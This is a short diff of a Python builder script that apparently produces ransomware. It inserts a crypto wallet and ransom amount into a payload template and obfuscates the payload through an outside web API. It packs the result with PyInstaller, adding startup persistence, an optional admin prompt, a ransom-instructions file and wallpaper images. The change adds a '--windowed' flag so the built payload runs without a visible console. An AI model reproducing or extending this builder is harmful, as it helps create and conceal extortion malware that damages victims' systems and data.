@@ -67,7 +67,7 @@ class Main:
             "ADD_TO_STARTUP": startup,
             "ADMIN": admin
         }
-
+        
         src = requests.get('https://septicx.repl.co/api/obfuscate', json={
             "options": {
                 "base": self.base,
@@ -93,7 +93,7 @@ class Main:
             file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)))
 
 
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\files\\annoy.mp3;.', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper_AJ3.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--clean', f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\files\\annoy.mp3;.', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper_AJ3.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--clean', f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
